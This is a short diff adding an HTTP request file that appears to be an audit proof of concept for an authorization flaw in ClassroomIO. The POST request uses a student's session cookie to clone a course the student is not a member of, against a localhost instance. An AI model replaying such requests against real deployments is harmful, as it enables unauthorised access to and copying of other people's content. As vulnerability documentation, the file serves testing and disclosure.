@@ -1,0 +1,9 @@
+### VULN-005 — clone any course as a STUDENT (no membership of the source)
+### Cookie: classroomio.session_token=<STUDENT session, not a member of the source course>
+
+POST http://localhost:21527/course/af357990-0a59-45c4-b14a-918ed3ef6153/clone HTTP/1.1
+Host: localhost:21527
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+
+{"title":"Stolen","slug":"stolen-s_29bde6bb","organizationId":"48bbdff8-2ad5-46a3-a259-2ca3d52677dd"}
